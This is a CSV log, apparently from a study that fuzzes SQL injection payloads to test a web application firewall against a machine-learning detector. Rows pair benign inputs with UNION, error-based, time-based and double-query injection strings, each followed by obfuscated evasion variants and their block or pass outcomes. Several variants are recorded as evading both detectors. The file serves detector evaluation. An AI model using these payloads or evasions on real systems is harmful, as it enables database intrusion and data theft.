Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T19:52:21.012521,mouchet@007tv.fj,200,200,200,both_correct,mouchet@007tv.fj,2024-12-16T19:52:21.890859,200,200,both_correct,mouchet@007tv.fj,2024-12-16T19:52:23.777241,200,200,both_correct,mouchet@007tv.fj,2024-12-16T19:52:25.656687,200,200,both_correct,mouchet@007tv.fj,2024-12-16T19:52:27.561677,200,200,both_correct,mouchet@007tv.fj,2024-12-16T19:52:29.481412,200,200,both_correct
12,2024-12-16T19:52:31.343089,3.62194E+15,200,200,200,both_correct,(SELeCt	5453 Like (SeLEcT 1)).62194E+15,2024-12-16T19:52:31.957167,403,403,both_incorrect,(selecT 'x]' not like 'x]L' like/**/(seLeCT  OR 0)).62194E+0xf,2024-12-16T19:52:34.912531,403,200,waf_incorrect_ml_correct,(seLect 'x]'	not like 'x]L' LiKE/**/(SEleCT/**/ Or (SELECT '0x5'='5'))).62194E+0xf,2024-12-16T19:52:39.173897,403,403,both_incorrect,"(SElEcT 'x]'
not like 'x]L'/**/liKE/**/(sEleCt/**/ OR (selECt '0x5' LiKE '2706 IN (2705,(SELECT  AND 1),2707)'))).62194E+0xf",2024-12-16T19:52:44.125018,403,403,both_incorrect,"(SelECT 'x]'	not like 'x]L'/**/like/**/(seLECt  || (sELeCt '0x5' likE '2706 IN ((SELECT 0x1),(SELECT  AND 1),'qa[' LIKE 'qa[')'))).62194E+0xf",2024-12-16T19:52:51.006444,403,403,both_incorrect
13,2024-12-16T19:52:58.724534,"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq",403,403,200,waf_correct_ml_incorrect,"1""  /**/)    )     )   procedure analyse  ( 	extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  6307=(SELECT 1),md5  (  0x52515a50   )    )      )    )     )  ,0x1  )   and    (    (     (  ""tabq"" like ""tabq",2024-12-16T19:53:08.520806,403,200,waf_correct_ml_incorrect," oR 0""  /*6^$L;*/) /**/  )     )   procedure analyse  ( 
extractvalue  (  2595<>0xa24,concat  (  0x5c,  (  benchmark  (  6307=(SELECT 1),md5  (  0x52515a50   )    )      )    )     )  ,0x1  )   and    (    (     (  ""tabq"" like ""tabq",2024-12-16T19:53:19.558595,403,200,waf_correct_ml_incorrect," || 0""  /**/) /**/  )     )   procedure analyse  ( 
extractvalue  (  '_'='_'<>0xa24,concat  (  0x5c,  (  benchmark  (  (SELECT 6307)=(SELECT (SELECT 1)),md5  (  0x52515a50   )    )      )   
)     )  ,0x1 /**/)   and    (    (     (  ""tabq"" like ""tabq",2024-12-16T19:53:31.684799,403,200,waf_correct_ml_incorrect,"  or  0x0""  /**/) /**/  )  /**/  )   procedure analyse  ( 
extractvalue  (  '_'='_'<>0xa24,concat  (  0x5c,  (  benchmark  (  (SELECT (SELECT 1))=(SELECT (SELECT 'n' NOT LIKE 'nD')),md5  (  0x52515a50   )    )      )   	)     )  ,0x1 /**/)   and    (    (     (  ""tabq"" like ""tabq",2024-12-16T19:53:44.565464,403,403,both_correct,"  Or  0x0""  /**/) /**/  )  /**/  )   procedure analyse  ( 
extractvalue  (  '_'='_'<>0xa24,concat  (  0x5c,  (  benchmark  (  (SELECT (SELECT 'iX&' NOT LIKE 'iX&?'))=(SELECT (SELECT 'n' NOT/**/LIKE 'nD')),md5  (  0x52515a50   )    )      )    )     )  ,0x1 /**/)   and    (    (     (  ""tabq"" like ""tabq",2024-12-16T19:53:59.013891,403,403,both_correct
14,2024-12-16T19:54:14.306304,arjona,200,200,403,waf_correct_ml_incorrect,arjona,2024-12-16T19:54:14.724138,200,403,waf_correct_ml_incorrect,arjona,2024-12-16T19:54:16.146229,200,403,waf_correct_ml_incorrect,arjona,2024-12-16T19:54:17.567426,200,403,waf_correct_ml_incorrect,arjona,2024-12-16T19:54:18.980242,200,403,waf_correct_ml_incorrect,arjona,2024-12-16T19:54:20.406461,200,403,waf_correct_ml_incorrect
15,2024-12-16T19:54:21.833134,"1%""   )    )    order by 1--",403,403,403,both_correct,"1%""   )    )  /**/ order by '3@=y(' LIKE '(SELECT
(SELECT 1))@=y('--",2024-12-16T19:54:23.528011,403,403,both_correct,"1%""   )  	 )    order by ' OR 0@=y(' LiKe '(SELECT
(SELECT (SELECT '=a'!='=a1')))@=y('--",2024-12-16T19:54:27.868628,403,403,both_correct,"1%""   )  
 )    order by ' OR  OR (SELECT 0)@=y(' lIKe '(SELECT
(SELECT (SELECT '=a'!=' LIKE/**/a8670 IN (8669,8670,8671)')))@=y('--",2024-12-16T19:54:33.217405,403,403,both_correct,"4975 IN (4974,4975,4976)%""   )  
 )    order by '	OR  OR (SELECT (SELECT/**/0))@=y(' LiKe '(SELECT
(SELECT (SELECT ' LIKE a'!=' Like/*/*/a8670 in (8669, OR 0,8671)')))@=y('--",2024-12-16T19:54:40.627565,403,403,both_correct,"0x136f In (4974,4975,2857<>2858)%""   )  
 )    order by ' OR  OR (SELECT (SELECT/*$=*/0))@=y(' lIke '(SELECT
(SELECT (SELECT ' LiKE a'!=' LiKE/*/*/a OR 0 iN (8669, oR/**/0,8671)')))@=y('--",2024-12-16T19:54:50.218967,403,403,both_correct
16,2024-12-16T19:55:00.369734,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",403,403,200,waf_correct_ml_incorrect,"'P'<>'PP'%'   )    )     )   or extractvalue  (   OR 0,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297
 =  (SELECT 1297),1   )    )     )  ,0x717a767a71   )    )    and   /**/(    (     (  '%'  =  '",2024-12-16T19:55:09.307346,200,200,both_incorrect,"'P'!='PP'%'   )    )     )   or extractvalue  (   OR  OR 0,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9474<>0x2503
 =  (SELECT 1297),1   )    )     )  ,0x717a767a71   )    )    and    (   	(     (  '%'  =  '",2024-12-16T19:55:20.536791,200,200,both_incorrect,"'P' not like/**/'PP'%'   )    )     )   or extractvalue  (   OR  OR 0,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (   AND 1<>0x2503  =  (SELECT 5494 LIKE 5494),0x1   )    )     )  ,0x717a767a71   )    )    and    (   	(     (  '%'  =  '",2024-12-16T19:55:31.921720,200,200,both_incorrect,"'P' not like/**/'PP'%'   )    )     )   or extractvalue  (   OR  OR (SELECT 0),concat  (  0x5c,0x7171706a71,  (  select   (  elt  ( 
 AND 1<>0x2503  =  (SELECT '1vG' LIKE '1vG' LIKE  OR 0),0x1   )/**/   )     )  ,0x717a767a71   )    )    and    (   	(     (  '%'  =  '",2024-12-16T19:55:44.570895,403,403,both_correct,"'P' not like 'PP'%'   )    )     )   or extractvalue  (   OR  OR (SELECT '(L?'<>'(L?p'),concat  (  0x5c,0x7171706a71,  (  select   (  elt  ( 	 AND 0x1<>0x2503  =  (SELECT '1vG' LIKE '1vG' LIKE  OR (SELECT 1)),0x1   )/**/   )     )  ,0x717a767a71   )    )    and    (   	(     (  '%'  =  '",2024-12-16T19:55:58.164018,403,403,both_correct
17,2024-12-16T19:56:12.917582,ed,200,200,200,both_correct,ed,2024-12-16T19:56:13.147412,200,200,both_correct,ed,2024-12-16T19:56:14.369480,200,200,both_correct,ed,2024-12-16T19:56:15.598421,200,200,both_correct,ed,2024-12-16T19:56:16.823768,200,200,both_correct,ed,2024-12-16T19:56:18.052177,200,200,both_correct
18,2024-12-16T19:56:19.288774,"1'  )   as wtfo where 5666  =  5666 union all select null,null,null,null--",403,403,403,both_correct,"(SelEct 1)'  )   As wtfo	wHEre 3621 in ( AND/**/1,3621,3622)   liKe   5666 union all SElEct null,null,null,null--",2024-12-16T19:56:22.936296,403,403,both_correct,"(SElect (SELECT 1))'  )   As wtfo	wHErE 3621 iN	( aND/**/1,1039 IN (1038,1039,1040),(sELect 1)) /**/ LIke   5666 union all seLeCT null,null,null,null--",2024-12-16T19:56:29.377383,403,403,both_correct,"(seLECT (SelEct 1))'  )   as/**/wtfo
WHeRE 3621 iN	( ANd/**/ And 1,(SELECT 1039) in (6893 NOT LIKE 6894,1039,1040),(sEleCT 1)) /**/ lIKe   5666 union all SEleCt null,null,null,null--",2024-12-16T19:56:37.944650,403,403,both_correct,"(selEct (SelEcT 1))'  )   as wtfo	WHeRE 3621 iN	( ANd/**/ And 1,(SELECT  OR 0) in ((SELECT 6893) not like 6894,1039,1040),(sEleCT 1)) /**/ lIKe   '-S'!='-S[' union all sELecT null,null,null,null--",2024-12-16T19:56:47.477472,403,403,both_correct,"(SeLEct (seleCt 1))'  )   as wtfo WHeRE 3621 iN	( ANd/**/ And/**/1,(SELECT  OR (SELECT 1)) in ((SELECT 6893) not like 'l{'!='l{(',(SELECT 1039),1040),(sEleCT 1)) /*i]r*/ lIKe   '-S'!='-S[' union all seLEcT null,null,null,null--",2024-12-16T19:56:57.940176,403,403,both_correct
19,2024-12-16T19:57:10.019615,80029600l,200,200,200,both_correct,80029600l,2024-12-16T19:57:10.572455,200,200,both_correct,80029600l,2024-12-16T19:57:12.127488,200,200,both_correct,80029600l,2024-12-16T19:57:13.674653,200,200,both_correct,80029600l,2024-12-16T19:57:15.258128,200,200,both_correct,80029600l,2024-12-16T19:57:16.817198,200,200,both_correct
20,2024-12-16T19:57:18.368410,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",403,403,403,both_correct,"(SELECT 1)   )    )     )   Or row  (/**/ 1045,7562  )  >  (  sELEcT count  (  *  )  ,concat  (  0x7171706a71,  (  seLecT   (  elt  (  (SELECT 1045)   like   1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    ) 
 x froM   (  SelEcT 8488 union SeleCT 5584 union SelECT 3051 union SELeCT 1210  )  a group by x  )   and    (    (     (  1782  =  'Y'<>'YL'",2024-12-16T19:57:34.664831,403,200,waf_correct_ml_incorrect,"(seLeCt 1)   )    )     )   or row  (/**/ 1045,7562  )  >  (  SeLECt count  (  *  )  ,concat  (  0x7171706a71,  (  SeLEct   (  elt  (  (seleCT 1045)   lIKe   (SELECT 0x1),1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    ) 
 x FrOM   (  sELEcT 8488 union sELect 5584 union SelEcT 'e'='e' union SeLECT 1210  )  a group by x  )   aND    (    (   /**/	(  1782  =  'Y' not like 'YL'",2024-12-16T19:57:53.281442,403,200,waf_correct_ml_incorrect,"(sElEcT 1)   )    )
    )   OR row  (/**/ 1045,7562  )  >  (  seLeCT count  (  *  )  ,concat  (  0x7171706a71,  (  sELecT   (  elt  (  (select 1045)   Like   (select/**/0x1),1   )    )     )  ,0x717a767a71,floor  (  rand  (   AND 1  )  *2   )    ) 
 x From   (  SELeCt 8488 union selECT 5584 union SELECt 'e' like 'e' union SEleCT 2570=(SELECT 2570)  )  a group by x  )   ANd    (    (   /**/	(  1782  =  'Y' not like 'YL'",2024-12-16T19:58:13.094045,403,403,both_correct,"(SELECT 'hQ'!='hQ[')   )    )
    )   || row  (  1045,7562  )  >  (  seLECT count  (  *  )  ,concat  (  0x7171706a71,  (  sElEct   (  elt  (  (seLeCT 1045)   LIKe   (seLeCt/**/0x1),1   )    )     )  ,0x717a767a71,floor
 (  rand  (   aND 1  )  *2   )    ) 
 x fROm   (  SeLEct 8488 union SELeCt (SELEct 1) union SELect 'e' LikE 'e' union selecT 2570=(SelEct 0xa0a)  )  a group by x  )   anD    (    (   /**/	(  1782  =  'Y' not like 'YL'",2024-12-16T19:58:34.124874,403,200,waf_correct_ml_incorrect,"(sELEct 'hQ'!='hQ[')   )    )
    )   || row  (  1045,7562  )  >  (  sELeCT count  (  *  )  ,concat  (  0x7171706a71,  (  SEleCT   (
 elt  (  (seLeCt 1045)   liKE   (SEleCt/*2W <'7)e{Q' NOT LIKE '7)e{Q|'*/0x1),1   )    )     )  ,0x717a767a71,floor
 (  rand  (   aND 1  )  *(SELECT 2)   )    ) 
 x FroM   (  SElEcT 8488 union SELeCT (selECt 1) union SelecT 'e' LikE 'e' union seleCT (SELECT 1) LIKE (SELEct 0xa0a)  )  a group by x  )   aND    (    (    	(  1782  =  'Y' not like 'YL'",2024-12-16T19:58:55.815815,403,403,both_correct
21,2024-12-16T19:59:19.665351,3748ny,200,200,200,both_correct,3748ny,2024-12-16T19:59:20.081782,200,200,both_correct,3748ny,2024-12-16T19:59:21.478472,200,200,both_correct,3748ny,2024-12-16T19:59:22.900057,200,200,both_correct,3748ny,2024-12-16T19:59:24.331981,200,200,both_correct,3748ny,2024-12-16T19:59:25.739191,200,200,both_correct
22,2024-12-16T19:59:27.156687,"1%'  )   union all select null,null,null,null,null,null,null,null#",403,403,403,both_correct,"(SeLeCT  AND 1) liKe 4782%' 	)/**/  union all seLECt null,null,null,null,null,null,null,null#",2024-12-16T19:59:30.363210,403,403,both_correct,"(sElECT  And 1) likE  OR '2+]'<>'(SELECT 2)+]d'%' 	)   union all	SELECt null,null,null,null,null,null,null,null#",2024-12-16T19:59:36.108902,403,403,both_correct,"(SELEct /**/ANd 'z4R'<>'z4RQ') LIke  OR '(SELECT 2)+]' not like '(SELECT (SELECT 1))+]d'%'  )   union all	SELect null,null,null,null,null,null,null,null#6",2024-12-16T19:59:42.535996,403,403,both_correct,"(sEleCT/**//**/aND 'z4R'<>'z4RQ') lIke  || '(SELECT  AND 1)+]' not like '(SELECT (SELECT
0x1))+]d'%'  )   union all	SELect null,null,null,null,null,null,null,null#'m'='m'D",2024-12-16T19:59:50.812754,403,403,both_correct,"(SelEct/**//**/aND 'z4R' NOT LIKE 'z4RQ') liKE 
|| '(SELECT  AND  AND (SELECT 8338) NOT LIKE 8339)+]' not like/**/'(SELECT (SELECT
0x1))+]d'%'  )   union all	SELect null,null,null,null,null,null,null,null#'m'='m'D*",2024-12-16T20:00:00.027947,403,403,both_correct
23,2024-12-16T20:00:11.528247,ajona valenzuela,200,200,200,both_correct,ajona	valenzuela,2024-12-16T20:00:12.412545,200,200,both_correct,ajona/**/valenzuela,2024-12-16T20:00:14.261866,200,200,both_correct,ajona/*Q[~<*/valenzuela,2024-12-16T20:00:16.286168,200,200,both_correct,ajona valenzuela,2024-12-16T20:00:18.496747,200,200,both_correct,ajona/**/valenzuela,2024-12-16T20:00:20.393337,200,200,both_correct
24,2024-12-16T20:00:22.416595,"c/ alcorac, 102",200,200,200,both_correct,"c/ alcorac,
 and/*_*/5513!=(SELECT 5514)",2024-12-16T20:00:23.267836,200,200,both_correct,"c//*t|D*/alcorac,  aNd/**/0x1589<>(sElEcT '#='='#=')",2024-12-16T20:00:26.269151,403,200,waf_incorrect_ml_correct,"c//*t|D*/alcorac, 	And 0x1589<>(SELEct '#=' lIKE '#=')(sELEct '=%' LIKe '=%')",2024-12-16T20:00:29.822638,403,403,both_incorrect,"c//*t|D*/alcorac,  And 0x1589 not like (sElEct '#=' LikE '#=')(SELEcT/*d:P	,*/'=%' LiKe '=%')",2024-12-16T20:00:34.875150,403,200,waf_incorrect_ml_correct,"c//*t|D*/alcorac,  anD 0x1589 not like	(SElEct '#='/**/liKe '#=')(SeLecT/*%ahQJ*/'=%' likE '=%')",2024-12-16T20:00:40.433348,403,200,waf_incorrect_ml_correct
